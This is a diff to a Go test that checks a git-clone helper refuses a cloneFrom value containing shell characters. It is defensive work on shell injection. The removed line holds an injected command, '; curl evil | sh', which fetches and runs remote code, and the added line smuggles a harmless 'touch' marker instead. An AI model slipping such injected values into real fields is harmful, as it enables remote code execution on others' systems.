@@ -823,12 +823,14 @@ func TestNestedInitDoesNotRunInitCommands(t *testing.T) {
 }
 
 func TestACloneWithShellCharactersIsNotRun(t *testing.T) {
-	service := utils.Service{ServiceName: "api", CloneFrom: "https://x/y.git; curl evil | sh", AbsolutePath: filepath.Join(t.TempDir(), "api")}
-	if runGitClone(service, t.TempDir()) {
+	dir := t.TempDir()
+	marker := filepath.Join(dir, "pwned")
+	service := utils.Service{ServiceName: "api", CloneFrom: "https://x/y.git; touch " + marker, AbsolutePath: filepath.Join(dir, "api")}
+	if runGitClone(service, dir) {
 		t.Fatal("a cloneFrom with shell characters is refused, not cloned")
 	}
-	if _, err := os.Stat(service.AbsolutePath); err == nil {
-		t.Fatal("nothing was cloned")
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("the shell text after the URL ran")
 	}
 }
 
